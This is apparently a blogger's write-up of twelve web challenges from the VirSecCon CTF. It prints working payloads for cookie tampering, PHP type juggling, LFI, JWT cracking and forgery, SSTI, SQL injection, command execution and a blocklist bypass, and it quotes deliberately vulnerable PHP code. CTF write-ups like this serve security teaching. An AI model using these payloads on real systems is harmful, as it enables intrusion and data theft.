# VirSecCon CTF "Web Challenges"


Here I will explain all the web challenges that I solved along with the tools used.
<!--more-->

---
## Web Challenges

Web challenge was related to the Php, Server Side Template Injection(SSTI), SQL vulnerability, Jwt etc..

### 1. Countdown
#### Description [60]
We hear something beeping... is there something in the oven?

Connect here: http://jh2i.com:50036.

**Solution**:- As I visited the site there was nothing in source-code except `defuse.php` so I fired my burp-suite and intercepted and got `detonate_time` cookie as   
`Cookie: detonate_time=1587109772 `
and changed it more than it was   
`Cookie: detonate_time=99999999999999999999999999`
this way I got the flag.  

![countdown_flag](public/images/countdown_flag_virseccon.jpg)


### 2. Hot Access
#### Description [70]
Access to all the latest modules, hot off the press! What can you access?

Connect here: http://jh2i.com:50016

**Solution**:- As the challenge name was `hotaccess` and it was using a simple php module with resources from apache web server. So I checked the `date` and `time`  got the new paramter
`http://jh2i.com:50016/?m=modules/date.php`

 Now I accessed `.htaccess` as `?m=.htaccess` which was a default file created by apache in every webserver and got output.
 
 ![.htaccess](public/images/htaccess_virseccon.jpg)
 
 On viewing-source code I got `sshh_don_tell_i_hid_the_flag_here` dir.

``` html
 <Directory /var/www/html/sshh_dont_tell_i_hid_the_flag_here>
	
	AllowOverride All
 
 </Directory></pre>
	</body>
```
and visited that dir as 
`?m=sshh_dont_tell_i_hid_the_flag_here/flag.txt`. Then I finally got the flag with 70 points.
> `LLS{htaccess_can_control_what_you_access}`

### 3. Magician
#### Description [80]
Show me a hat trick!

Connect here: http://jh2i.com:50000

**Solution**:- Challenge presents a hash in home page `==0e953532678923638053842468642408`. So I tried with md5 decrypt but failed then I looked over the challenge name word 'Magic Hash' and got this github repo which was quite interesting one.
[https://github.com/spaze/hashes/blob/master/md5.md](https://github.com/spaze/hashes/blob/master/md5.md)

Entering any string of that hash I got the flag. 

> `LLS{magic_hashes_make_for_a_good_show} `

### 4. PHPJuggler
#### Decription [80]
PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling!

Connect here: http://jh2i.com:50030.

**Solution**:- As I visited the site and found a php code which was working in backend.

```
<?php
    
    include('flag.php');

    if ( isset($_POST['flag']) ){
        if ( strcmp( $_POST['flag'], $flag ) == 0 ){
            echo("You got it! That's the correct flag! <br>");
            echo($flag);
        }else{
            echo("NOPE! Wrong flag.");
        }
        echo ("<br><br>");
    }

    highlight_file(__FILE__);   
?>
```
Here I found `strcmp()` function which compares the strings and that function willn't handle the array. So I fired my burp-suite and send parameter as an array. This way I got the flag .

`flag=fsd` =>> `flag[]=fsd`

```
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6
You got it! That's the correct flag!
LLS{php_dropped_the_ball_again}
```

### 5. GLHF
#### Description [90]
LMFAO! FLAG PLZ, THX!

Connect here: http://jh2i.com:50014

**Solution**:- After visiting the challenge I got many urls and I noticed `FLAG` and submit it as  
`/index.php?page=FLAG`
and got

```
 FLAG????
WTF, PLZ??? 
```
On viewing source I got 
```
    <!-- SRY PHP LFI NBD -->
```
So I php was vulnerable to LFI I brute forced with the wordlist of LFI and got the `php://filter/convert.base64-encode/resource=FLAG` as lfi injection point. You can visit here for more [Juggling tricks](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf).

```

PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg==
```
I tried to decode this and got the flag.
 
```

root@gr4n173:~# echo "PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== " | base64 -d  
<?php
    /*
    // _______________________________________________________________

                        LLS{lmfao_php_filters_ftw}

    // _______________________________________________________________
    */
?>
```

###  6. JaWT
#### Description [90]
Check the admin's scratchpad!

Connect here: http://jh2i.com:50019/

**Solution**:-On visiting the site I was able to login in as any user except `admin` so I fired my burp-suite and while intercepting with burp-suite I got the cookie parameter `jwt`  `jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.5nMC3j7S-1AH_LuDtr4LQwfnnN_3MiX--d1B07Kt07A`

Header:-
> {
  "alg": "HS256",
  "typ": "JWT"
}

Payload:-
> {
  "user": "user"


I found a superb website to edit jwt [jwt.io](https://jwt.io/).

and now requied a secret key for that I used john to crack the jwt

```
root@gr4n173:~#echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.DjF2o4bohTFKW9dyR6QfpU397jLnmvITGK8KgCYmXhQ" > jwt
root@gr4n173:~# john jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
fuckit           (?)
```
I used that secret key and edited user `user` => `admin`

![jwt_token](public/images/jwt_token_virseccon.png)

and submited in burp-suite and finally got the flag.

![jwt_flag](public/images/jwt_flag_virseccon.png)

> `LLS{jawt_was_just_what_you_thought}`

### 7. Mask
#### Description [90]
Take off your mask.

Connect here: http://jh2i.com:50023.

**Solution**:-After visiting challenge website I got the Jinja => Python template so first thing I thought was only Server-Side Template Injection(SSTI). so I tried 


![ssti](public/images/payload_virseccon.jpg)

and I got the `4` as output so then checked for `config` files.

![config](public/images/config_virseccon.jpg)

And got the many configuration keys along with `secret key`
> ``'SECRET_KEY': 'LLS{server_side_template_injection_unmasked}`

This way I got the flag. If you like to read more about SSTI then you can visit [here](https://owasp-skf.gitbook.io/asvs-write-ups/kbid-267-server-side-template-injection).

### 8. 10 Character Web Shell
#### Description [100]
Only 10 char--

Connect here: http://jh2i.com:50001.

**Solution**:- After visiting the challenge I got a simple php backend code. 

```
<?php

    $c = $_GET[c];

    if(strlen($c) < 10){
            echo shell_exec($c);
    }else{
            echo "too long!";
    }
    highlight_file(__FILE__);
?>
```
and used paramter as `http://jh2i.com:50001/?c=cat flag*`

> `LLS{you_really_can_see_in_the_dark} `

This way I got the flag .

### 9. Sequelitis
#### Description [100]
Sequelitis has moved to a new database for keeping track of their customers. Break in.

Connect here: http://jh2i.com:50034.

**Solution**:- As the challenge name `Sequelitis` which indicate there was sqli. So at first I tried a simple payload `' or 1==1 --` didn't work and slightly changed to `'or 1==1 -- -` I got the output 

```
Trey Maxam: 1010
Joe Benin: 2001
Grant Wyman: 1337
John Hammond: 1785
```

So after alot of checking the table and columns my final payload to get flag was `' union select value,2,3  from flag -- -`

> `LLS{explicit_sqli_is_how_sql_will_die} 2: 3`


### 10. Dairy Products
#### Description [100]
There is a new advertising campaign on the classic dairy company’s website. You need to steal their latest product.

Connect here: http://142.93.3.19:50008

**Solution**:- As soon as I visited the challenge got the hint as `git milk` and checked `.git` dir which gave me a git repo. Then I download to my localmachine .

> root@gr4n173:~# wget -r --no-parent http://142.93.3.19:50008/.git/

after that downloaded I used the command as 

```
root@gr4n173:~# git log | grep commit | awk '{print $2}' | while read line;do git show $line;done | grep -i "{.*}"
+LLS{you_gitm_gotm_good_partner}
+for i in {1..10}
```
> git log =>  It gives the commit history.

> grep commit => It grep the commit only .

> awk '{print $2}' => It just takes the commitsha.

> while read line;do git show $line; => it makes a loop for every shacommit and show all the commit .

> grep -i "{.*}" => It grep the flag. 

This way I solved the challenge and got 100 points.

### 11. Irregular Expressions
#### Description [100]
Check out our new regular expressions testbed! Now you can test your regex online at!

Connect here: http://jh2i.com:50018/

**Solution**:- After visiting the website and viewing the source code I got this.

```
<b>Warning</b>:  preg_replace(): Unknown modifier '\' in <b>/var/www/html/index.php</b> on line <b>39</b><br />
```

as [pre_replace()](https://www.php.net/manual/en/function.preg-replace.php) there you can find `/e`modifier to run the eval() command so I used it 

![irregular_express](public/images/irregular_virseccon.png) 

this way I can run the RCE so I used `system('ls -al');` to get the files.

```
total 16 dr-xr-xr-x 1 www-data www-data 4096 Apr 2 14:33 . drwxr-xr-x 1 root root 4096 Sep 4 2016 .. -r--r--r-- 1 root root 39 Apr 2 14:32 flag_name_dont_guess_plz -rwxr-xr-x 1 root root 2538 Mar 22 00:49 index.php 
```
So got the final flag using `system('cat flag_name_dont_guess_plz');`

> `LLS{php_preg_replace_may_be_dangerous} `


### 12. GET Encoded
#### Description [125]
I don't GET this%21 Do you%3F

Connect here: http://jh2i.com:50013

**Solution**:- After visiting the challenge,viewing the source code and robots.txt. I got the dir at robots.txt. 

![robots.txt](public/images/robots_virseccon.jpg)

then I visited that dir `http://jh2i.com:50013/?debug` and got the code below.

```
?php

    function debug(){
        highlight_file(__FILE__);

    }
    

    // I hate these functions, they are so insecure!
    $blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";


    // If you supply GET arguments, process them...
    // Documentation here: http://php.net/manual/en/reserved.variables.get.php
    if ( count( $_GET ) > 0 ){

        // Check if there are any bad functions in the URL supplied
        if ( preg_match( "/$blacklist/i", $_SERVER['REQUEST_URI'] ) ) {

            // If there are all, kindly tell them off. ;)
            // Documentation here: http://php.net/manual/en/reserved.variables.server.php
            die( "Go away, hacker! No unsafe functions in \$_SERVER['REQUEST_URI']!!" );
        
        }else{

            // Otherwise, execute code as a usual debugging interface.
            // Pull them out of the GET array as `variable=value` format...
            list( $function, $argument ) = each($_GET);

            // and call what they supply...
            // THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN'T INCLUDE `/?debug`
            echo("<pre>");
            $function($argument);
            echo("</pre>");
        }

    }
    
    echo("<p>Machines hunt for more than humans do.</p>");
```

So I sent a request with url encoding technique you see [here](https://www.eso.org/~ndelmott/url_encode.html) `?passthru=cat flag_that_you_could_never_guess.php`  but not decoded the `=`


![flag](public/images/getencodedflag_virseccon.png)

This way I solved the challenge.

This way I was able to solve all challenges from web category except the last one.

I would like to thank all my reader for being with me. Stay upto date to my blog to see more writeups

#Stay_Safe

#COVID-19

